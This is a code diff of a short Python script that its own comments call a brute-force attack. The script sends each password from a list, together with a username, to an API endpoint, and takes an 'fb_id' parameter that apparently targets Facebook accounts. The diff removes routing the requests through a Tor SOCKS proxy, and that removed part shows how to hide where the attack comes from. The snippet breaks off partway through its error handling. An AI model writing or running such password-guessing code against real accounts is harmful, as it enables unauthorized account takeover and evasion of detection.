@@ -1,25 +1,15 @@
 import requests
-from requests.auth import HTTPProxyAuth
-
-# Tor proxy details
-tor_proxy_ip = "127.0.0.1"
-tor_proxy_port = "9050"
-tor_proxy_auth = HTTPProxyAuth('your_tor_proxy_username', 'your_tor_proxy_password')  # Modify with your Tor proxy credentials if needed
 
 # Local API details
 local_api_url = "http://127.0.0.1:5000/your-api-endpoint"
 
-# Function to perform brute force attack using Tor as a proxy
+# Function to perform brute force attack without Tor proxy
 def brute_force(username, fb_id, passwords):
     for password in passwords:
-        # Use the requests library with SOCKS proxy
-        proxies = {'http': f'socks5h://{tor_proxy_ip}:{tor_proxy_port}',
-                   'https': f'socks5h://{tor_proxy_ip}:{tor_proxy_port}'}
-
         try:
-            # Example: Make a request to the local API using Tor as a proxy
-            result = requests.get(local_api_url, params={'username': username, 'password': password},
-                                  proxies=proxies, timeout=10, auth=tor_proxy_auth)
+            # Example: Make a request to the local API without using a proxy
+            result = requests.get(local_api_url, params={'username': username, 'password': password}, timeout=10)
+            
             # Process result as needed
             print(result.text)
         except requests.exceptions.RequestException as e:
